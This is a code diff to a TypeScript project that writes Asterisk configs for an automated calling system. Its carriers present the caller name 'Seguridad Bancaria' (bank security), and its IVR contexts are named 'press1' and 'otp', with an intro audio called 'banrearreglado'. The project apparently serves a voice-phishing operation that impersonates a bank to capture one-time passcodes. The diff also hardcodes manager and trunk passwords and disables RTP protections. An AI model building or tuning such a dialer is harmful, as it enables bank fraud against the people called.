@@ -585,9 +585,9 @@ vbr=true
 rtpstart=10000
 rtpend=20000
 rtpchecksums=no
-strictrtp=yes
-probation=8
-icesupport=yes
+strictrtp=no
+probation=0
+icesupport=no
 `;
 
   try {
@@ -595,10 +595,9 @@ icesupport=yes
       writeAsteriskConfigFile(codecsPath, codecsContent);
       console.log('✓ Configuración /etc/asterisk/codecs.conf creada para HD Opus y Speex Denoise');
     }
-    if (!fs.existsSync(rtpPath)) {
-      writeAsteriskConfigFile(rtpPath, rtpContent);
-      console.log('✓ Configuración /etc/asterisk/rtp.conf creada');
-    }
+    writeAsteriskConfigFile(rtpPath, rtpContent);
+    try { fs.writeFileSync(path.join(process.cwd(), 'rtp.conf'), rtpContent, 'utf8'); } catch (_) {}
+    console.log('✓ Configuración /etc/asterisk/rtp.conf actualizada para audio inmediato');
     const mgrPath = '/etc/asterisk/manager.conf';
     if (!fs.existsSync(mgrPath)) {
       const mgrContent = `[general]\nenabled = yes\nport = 5038\nbindaddr = 0.0.0.0\n\n[sammy]\nsecret = Robert2026RDTGcvgbsg\nread = all\nwrite = all\n\n[admin]\nsecret = mysecretpass\nread = all\nwrite = all\n`;
@@ -1146,9 +1145,9 @@ export const defaultCarriersList = [
     username: 'sgavilan30',
     secret: 'Robert2026',
     inboundContext: 'trunkinbound',
-    outboundCallerId: '+18005550199',
+    outboundCallerId: '+18494386040',
     outboundCallerIdName: 'Seguridad Bancaria',
-    codecs: ['opus', 'g722', 'ulaw', 'alaw', 'g729'],
+    codecs: ['ulaw', 'alaw', 'g729'],
     qualifyFreq: 60,
     status: 'reachable',
     latencyMs: 18,
@@ -1171,7 +1170,7 @@ export const defaultCarriersList = [
     inboundContext: 'trunkinbound',
     outboundCallerId: '+18494386040',
     outboundCallerIdName: 'Seguridad Bancaria',
-    codecs: ['opus', 'g722', 'ulaw', 'alaw', 'g729'],
+    codecs: ['ulaw', 'alaw', 'g729'],
     qualifyFreq: 60,
     status: 'reachable',
     latencyMs: 18,
@@ -1393,12 +1392,20 @@ export function generateCleanPjsipConf(extensions: any[] = defaultExtensionsList
   pjsipContent += `[transport-udp]\n`;
   pjsipContent += `type = transport\n`;
   pjsipContent += `protocol = udp\n`;
-  pjsipContent += `bind = 0.0.0.0:${activePort}\n\n`;
+  pjsipContent += `bind = 0.0.0.0:${activePort}\n`;
+  pjsipContent += `local_net = 127.0.0.0/8\n`;
+  pjsipContent += `local_net = 10.0.0.0/8\n`;
+  pjsipContent += `local_net = 172.16.0.0/12\n`;
+  pjsipContent += `local_net = 192.168.0.0/16\n\n`;
 
   pjsipContent += `[transport-tcp]\n`;
   pjsipContent += `type = transport\n`;
   pjsipContent += `protocol = tcp\n`;
-  pjsipContent += `bind = 0.0.0.0:${activePort}\n\n`;
+  pjsipContent += `bind = 0.0.0.0:${activePort}\n`;
+  pjsipContent += `local_net = 127.0.0.0/8\n`;
+  pjsipContent += `local_net = 10.0.0.0/8\n`;
+  pjsipContent += `local_net = 172.16.0.0/12\n`;
+  pjsipContent += `local_net = 192.168.0.0/16\n\n`;
 
   pjsipContent += `[transport-wss]\n`;
   pjsipContent += `type = transport\n`;
@@ -2772,17 +2779,13 @@ export function generateCleanDialplanConf(
   dialplanContent += `[ivr-press1]\n`;
   dialplanContent += `exten => s,1,NoOp(=== [IVR-PRESS1] INICIO MODO PRESS 1 CON AUDIO HD ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
-  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
-  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Wait(0.4)\n`;
   dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
-  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=2)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=in_ivr)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=in_ivr&channel=\${CHANNEL}" &)\n`;
   dialplanContent += ` same => n,UserEvent(CallAnswered,Number=\${TARGET_DEST},Context=ivr-press1,Channel=\${CHANNEL})\n`;
-  dialplanContent += ` same => n,NoOp(=== [IVR-PRESS1] ESPERANDO 1.5 SEGUNDOS DE PAUSA NATURAL ANTES DEL AUDIO ===)\n`;
-  dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
@@ -2796,6 +2799,8 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/banrearreglado))\n`;
   dialplanContent += ` same => n,Set(IVR_INTRO=\${STRREPLACE(IVR_INTRO,.wav,)})\n`;
   dialplanContent += ` same => n,Set(IVR_INTRO=\${STRREPLACE(IVR_INTRO,custom/custom/,custom/)})\n`;
+  dialplanContent += ` same => n,Set(IVR_INTRO=\${STRREPLACE(IVR_INTRO,/var/lib/asterisk/sounds/,)})\n`;
+  dialplanContent += ` same => n,Set(IVR_INTRO=\${STRREPLACE(IVR_INTRO,/usr/share/asterisk/sounds/,)})\n`;
   dialplanContent += ` same => n,NoOp(=== [IVR-AUDIO] Reproduciendo Audio Intro: \${IVR_INTRO} para Destino: \${TARGET_DEST} ===)\n`;
   dialplanContent += ` same => n(menu),Background(\${IVR_INTRO})\n`;
   dialplanContent += ` same => n,WaitExten(4)\n`;
@@ -2842,17 +2847,13 @@ export function generateCleanDialplanConf(
   dialplanContent += `[ivr-otp]\n`;
   dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS Y CALIDAD HD ===)\n`;
   dialplanContent += ` same => n,Answer()\n`;
-  dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=max_350,target_60)\n`;
-  dialplanContent += ` same => n,Set(DENOISE(rx)=on)\n`;
-  dialplanContent += ` same => n,Set(DENOISE(tx)=on)\n`;
+  dialplanContent += ` same => n,Wait(0.4)\n`;
   dialplanContent += ` same => n,Set(VOLUME(rx)=1)\n`;
-  dialplanContent += ` same => n,Set(VOLUME(tx)=1)\n`;
+  dialplanContent += ` same => n,Set(VOLUME(tx)=2)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
   dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_DEST})=in_ivr)\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_DEST}&status=in_ivr&channel=\${CHANNEL}" &)\n`;
   dialplanContent += ` same => n,UserEvent(CallAnswered,Number=\${TARGET_DEST},Context=ivr-otp,Channel=\${CHANNEL})\n`;
-  dialplanContent += ` same => n,NoOp(=== [IVR-OTP] ESPERANDO 1.5 SEGUNDOS DE PAUSA NATURAL ANTES DEL AUDIO ===)\n`;
-  dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(digit)=1)\n`;
   dialplanContent += ` same => n,Set(TIMEOUT(response)=4)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
